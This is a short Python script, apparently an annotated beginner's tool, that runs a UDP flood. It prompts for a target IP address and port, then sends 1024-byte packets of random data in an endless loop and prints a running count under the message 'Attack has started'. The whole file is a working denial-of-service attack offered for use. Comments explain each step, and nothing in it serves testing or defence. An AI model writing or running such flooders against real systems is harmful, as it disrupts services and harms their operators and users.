import socket
import signal
import sys
import os

os.system('cls')

targetIP = input('Target IP Address: ')
port = int(input('Port: '))

random_bytes = os.urandom(1024) # Generates 1024 bytes of random data.
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Creates a socket object for IPv4 addresses and the UDP (User Datagram Protocol). The code will use it to send UDP packets to the target IP address that will be used in this attack.

def handle_exit(signum, frame):
    print("Program terminated.")
    sys.exit(0)

count = 0 # A variable called 'Count' is created and initially sets its value to zero. The code will use this variable to maintain the number of packets sent.

while True:
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    sock.sendto(random_bytes, (targetIP, port)) # The code uses random data packets to send to the destination IP address and port. The Sock variable represents the previously created UDP socket object. One packet is sent every cycle.
    count += 1
    print('Attack has started. Number of packets sent: %s' % (count))